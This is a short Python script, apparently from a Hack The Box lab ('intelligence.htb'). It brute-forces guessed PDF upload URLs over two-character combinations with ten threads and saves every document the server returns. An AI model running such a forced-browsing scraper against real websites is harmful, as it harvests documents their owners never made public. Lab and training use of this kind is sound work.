import requests
import string
import itertools
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Define the base URL
base_url = "http://intelligence.htb/documents/2020-{}-{}-upload.pdf"

# Define the characters to use for fuzzing
characters = string.digits + string.ascii_lowercase

# Generate all possible combinations of characters
combinations = itertools.product(characters, repeat=2)

# Function to check a URL
def check_url(combination):
    url = base_url.format(combination[0], combination[1])
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"{Fore.GREEN}Found valid URL: {url}")
            with open(f"{combination[0]}-{combination[1]}.pdf", "wb") as f:
                f.write(response.content)
        else:
            print(f"{Fore.RED}Invalid URL: {url}")
    except requests.RequestException as e:
        print(f"{Fore.YELLOW}Error with URL {url}: {e}")

# Use ThreadPoolExecutor for multithreading
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(check_url, combinations)
